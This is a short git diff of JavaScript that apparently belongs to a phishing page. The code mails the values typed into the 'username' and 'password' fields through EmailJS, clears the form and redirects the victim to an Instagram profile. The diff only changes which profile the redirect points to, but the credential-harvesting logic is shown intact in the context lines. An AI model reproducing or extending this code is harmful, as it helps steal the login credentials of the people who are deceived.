@@ -16,7 +16,7 @@ function sendMail(event) {
     emailjs.send(serviceID, templateID, params).then((res) => {
       document.getElementById("username").value = "";
       document.getElementById("password").value = "";
-      window.location.href = "https://www.instagram.com/elizabetta_xoxo/";
+      window.location.href = "https://instagram.com/irina_sambruskaya/";
     });
   }
 
